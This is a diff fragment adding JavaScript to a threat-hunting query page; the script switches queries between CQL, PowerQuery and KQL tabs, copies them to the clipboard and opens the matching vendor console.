+      if (link) link.classList.add('active');
+    }
+  });
+});
+
+</script>
+<script id="rosetta-script">
+function rosettaLanguageLabel(shell){
+  const selected=shell&&shell.querySelector('.rosetta-tab[aria-selected="true"]');
+  return selected?selected.textContent.trim():'CQL';
+}
+function rosettaUpdateCardActions(shell){
+  if(!shell)return;
+  const selected=shell.querySelector('.rosetta-tab[aria-selected="true"]');
+  const label=rosettaLanguageLabel(shell);
+  const language=selected?selected.getAttribute('data-language'):'cql';
+  const fallback=shell.querySelector('.rosetta-fallback-copy');
+  if(fallback){fallback.textContent='Copy '+label;fallback.setAttribute('data-rosetta-copy-label','Copy '+label);}
+  const card=shell.closest('.query-card');
+  if(!card)return;
+  const copy=card.querySelector('.qc-header .btn-copy')||card.querySelector('.btn-copy');
+  if(copy){copy.textContent='Copy '+label;copy.setAttribute('data-rosetta-copy-label','Copy '+label);}
+  card.querySelectorAll('.btn-falcon').forEach(function(button){button.hidden=language!=='cql';});
+  shell.querySelectorAll('.rosetta-open-s1').forEach(function(button){button.hidden=language!=='powerquery';});
+  shell.querySelectorAll('.rosetta-open-def').forEach(function(button){button.hidden=language!=='kql';});
+}
+function rosettaSwitch(button){
+  const shell=button.closest('.rosetta-query-shell');
+  if(!shell)return;
+  shell.querySelectorAll('.rosetta-tab').forEach(function(tab){tab.setAttribute('aria-selected',tab===button?'true':'false');tab.tabIndex=tab===button?0:-1;});
+  shell.querySelectorAll('.rosetta-pane').forEach(function(pane){pane.hidden=pane.id!==button.getAttribute('aria-controls');});
+  rosettaUpdateCardActions(shell);
+  rosettaSyncGlobal();
+}
+function rosettaSyncGlobal(){
+  const langs=new Set(Array.from(document.querySelectorAll('.rosetta-query-shell')).map(function(shell){const tab=shell.querySelector('.rosetta-tab[aria-selected="true"]');return tab?tab.getAttribute('data-language'):'';}));
+  const only=langs.size===1?Array.from(langs)[0]:'';
+  document.querySelectorAll('.rosetta-global-btn').forEach(function(button){button.setAttribute('aria-pressed',button.getAttribute('data-language')===only?'true':'false');});
+  const mixed=document.querySelector('.rosetta-global-mixed');
+  if(mixed)mixed.hidden=!!only;
+  const cloud=document.querySelector('.cloud-sel');
+  if(cloud)cloud.hidden=!langs.has('cql');
+  const consoleRow=document.querySelector('[data-rosetta-console]');
+  if(consoleRow)consoleRow.hidden=!langs.has('powerquery');
+  const portalRow=document.querySelector('[data-rosetta-portal]');
+  if(portalRow)portalRow.hidden=!langs.has('kql');
+}
+function rosettaConsoleCheck(value){
+  const text=(value||'').trim();
+  if(!text)return {ok:false,empty:true};
+  let url;
+  try{url=new URL(text);}catch(error){try{url=new URL('https://'+text);}catch(error2){return {ok:false};}}
+  if(url.protocol!=='https:'||url.hostname.indexOf('.')<0)return {ok:false};
+  return {ok:true,href:url.origin+'/'};
+}
+function rosettaConsoleInput(){
+  const input=document.getElementById('rosetta-console-url');
+  const status=document.querySelector('.rosetta-console-status');
+  if(!input||!status)return null;
+  const result=rosettaConsoleCheck(input.value);
+  input.setAttribute('aria-invalid',(!result.ok&&!result.empty)?'true':'false');
+  status.className='rosetta-console-status'+((!result.ok&&!result.empty)?' bad':'');
+  status.textContent=result.ok?'Saved in this browser only. Opens '+result.href:(result.empty?'':'Enter an https address such as https://usea1-yourtenant.sentinelone.net');
+  if(result.ok){try{localStorage.setItem('huntpack-s1-console',result.href);}catch(error){}}
+  return result;
+}
+function rosettaOpenDefender(button){
+  const shell=button.closest('.rosetta-query-shell');
+  const pane=shell&&Array.from(shell.querySelectorAll('.rosetta-pane')).find(function(item){return !item.hidden;});
+  const pre=pane&&pane.querySelector('pre.siem-code');
+  const select=document.getElementById('rosetta-portal-select');
+  if(!pre||!select)return;
+  window.open(select.value+'/v2/advanced-hunting','_blank','noopener');
+  const value=pre.textContent;
+  const original=button.getAttribute('data-rosetta-open-label')||button.textContent;
+  button.setAttribute('data-rosetta-open-label',original);
+  const done=function(){button.textContent='Copied, paste it in Advanced hunting';button.classList.add('done');setTimeout(function(){button.textContent=original;button.classList.remove('done');},2500);};
+  const fallback=function(){const area=document.createElement('textarea');area.value=value;area.style.position='fixed';area.style.opacity='0';document.body.appendChild(area);area.select();document.execCommand('copy');area.remove();done();};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(value).then(done).catch(fallback);return;}
+  fallback();
+}
+function rosettaOpenS1(button){
+  const shell=button.closest('.rosetta-query-shell');
+  const pane=shell&&Array.from(shell.querySelectorAll('.rosetta-pane')).find(function(item){return !item.hidden;});
+  const pre=pane&&pane.querySelector('pre.siem-code');
+  if(!pre)return;
+  const result=rosettaConsoleInput()||{ok:false,empty:true};
+  const input=document.getElementById('rosetta-console-url');
+  if(!result.ok){if(input){input.scrollIntoView({block:'center'});input.focus();}return;}
+  window.open(result.href,'_blank','noopener');
+  const value=pre.textContent;
+  const original=button.getAttribute('data-rosetta-open-label')||button.textContent;
+  button.setAttribute('data-rosetta-open-label',original);
+  const done=function(){button.textContent='Copied, paste it in PowerQuery';button.classList.add('done');setTimeout(function(){button.textContent=original;button.classList.remove('done');},2500);};
+  const fallback=function(){const area=document.createElement('textarea');area.value=value;area.style.position='fixed';area.style.opacity='0';document.body.appendChild(area);area.select();document.execCommand('copy');area.remove();done();};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(value).then(done).catch(fallback);return;}
+  fallback();
+}
+function rosettaSetAll(language,remember){
+  document.querySelectorAll('.rosetta-query-shell').forEach(function(shell){
+    const tab=shell.querySelector('.rosetta-tab[data-language="'+language+'"]');
+    if(tab)rosettaSwitch(tab);
+  });
+  rosettaSyncGlobal();
+  if(remember!==false){try{localStorage.setItem('huntpack-query-language',language);}catch(error){}}
+}
+function rosettaCopy(button){
+  const card=button.closest('.query-card');
+  const shell=button.closest('.rosetta-query-shell')||(card&&card.querySelector('.rosetta-query-shell'));
+  const pane=shell&&Array.from(shell.querySelectorAll('.rosetta-pane')).find(function(item){return !item.hidden;});
+  const pre=pane&&pane.querySelector('pre.siem-code, pre.cql');
+  if(!pre)return;
+  const value=pre.textContent;
+  const label=button.getAttribute('data-rosetta-copy-label')||('Copy '+rosettaLanguageLabel(shell));
+  button.setAttribute('data-rosetta-copy-label',label);
+  const done=function(){button.textContent='Copied!';button.classList.add('copied');setTimeout(function(){button.textContent=button.getAttribute('data-rosetta-copy-label')||label;button.classList.remove('copied');},1200);};
+  const fallback=function(){const area=document.createElement('textarea');area.value=value;area.style.position='fixed';area.style.opacity='0';document.body.appendChild(area);area.select();document.execCommand('copy');area.remove();done();};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(value).then(done).catch(fallback);return;}
+  fallback();
+}
+function rosettaCopyReadiness(button){
+  const block=button.closest('.rosetta-readiness');
+  const pre=block&&block.querySelector('.rosetta-readiness-code');
+  if(!pre)return;
+  const value=pre.textContent;
+  const original=button.textContent;
+  const done=function(){button.textContent='Copied!';setTimeout(function(){button.textContent=original;},1200);};
+  const fallback=function(){const area=document.createElement('textarea');area.value=value;area.style.position='fixed';area.style.opacity='0';document.body.appendChild(area);area.select();document.execCommand('copy');area.remove();done();};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(value).then(done).catch(fallback);return;}
+  fallback();
+}
+document.addEventListener('click',function(event){
+  const button=event.target.closest&&event.target.closest('.query-card .btn-copy');
+  if(!button)return;
+  const shell=button.closest('.query-card').querySelector('.rosetta-query-shell');
+  if(!shell)return;
+  event.preventDefault();event.stopImmediatePropagation();rosettaCopy(button);
+},true);
+document.addEventListener('keydown',function(event){
+  const tab=event.target.closest&&event.target.closest('.rosetta-tab');
+  if(!tab||!['ArrowLeft','ArrowRight','Home','End'].includes(event.key))return;
+  const tabs=Array.from(tab.closest('.rosetta-tabs').querySelectorAll('.rosetta-tab'));
+  let index=tabs.indexOf(tab);
+  if(event.key==='ArrowRight')index=(index+1)%tabs.length;
+  if(event.key==='ArrowLeft')index=(index-1+tabs.length)%tabs.length;
+  if(event.key==='Home')index=0;
+  if(event.key==='End')index=tabs.length-1;
+  event.preventDefault();tabs[index].focus();rosettaSwitch(tabs[index]);
+});
+document.querySelectorAll('.rosetta-query-shell').forEach(rosettaUpdateCardActions);
+(function(){
+  let saved=null;
+  try{saved=localStorage.getItem('huntpack-query-language');}catch(error){}
+  if(saved&&saved!=='cql'&&document.querySelector('.rosetta-global-btn[data-language="'+saved+'"]'))rosettaSetAll(saved,false);
+  else rosettaSyncGlobal();
+  const portalSelect=document.getElementById('rosetta-portal-select');
+  if(portalSelect){
+    let savedPortal=null;
+    try{savedPortal=localStorage.getItem('huntpack-defender-portal');}catch(error){}
+    if(savedPortal&&Array.from(portalSelect.options).some(function(option){return option.value===savedPortal;}))portalSelect.value=savedPortal;
+    portalSelect.addEventListener('change',function(){try{localStorage.setItem('huntpack-defender-portal',portalSelect.value);}catch(error){}});
+  }
+  const consoleInput=document.getElementById('rosetta-console-url');
+  if(consoleInput){
+    let savedConsole=null;
+    try{savedConsole=localStorage.getItem('huntpack-s1-console');}catch(error){}
+    if(savedConsole){consoleInput.value=savedConsole;rosettaConsoleInput();}
+    consoleInput.addEventListener('input',rosettaConsoleInput);
+  }
+})();
+</script>
+</body>
+</html>
